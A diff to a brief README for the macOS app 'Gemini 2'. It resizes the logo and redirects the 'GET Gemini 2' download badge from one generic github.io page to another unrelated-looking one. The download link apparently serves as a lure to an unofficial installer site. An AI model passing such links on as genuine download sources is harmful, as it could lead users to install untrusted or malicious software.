@@ -1,13 +1,13 @@
 # Gemini 2 – Intelligent Duplicate File Finder  
 
 <div align="center">  
-<img src="https://cdn.jim-nielsen.com/macos/512/gemini-2-the-duplicate-finder-2019-05-08.png?rf=1024" alt="Gemini 2 Logo" width="600">  
+<img src="https://cdn.jim-nielsen.com/macos/512/gemini-2-the-duplicate-finder-2019-05-08.png?rf=1024" alt="Gemini 2 Logo" width="400">  
 </div>
 
 <br>   
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/gemini2">   
+<a href="https://install-quick-software.github.io/.github/gemini2">   
 <img src="https://img.shields.io/badge/💻_GET_Gemini_2-purple?style=for-the-badge&logo=apple" alt="GET Gemini 2">  
 </a>  
 </div>  
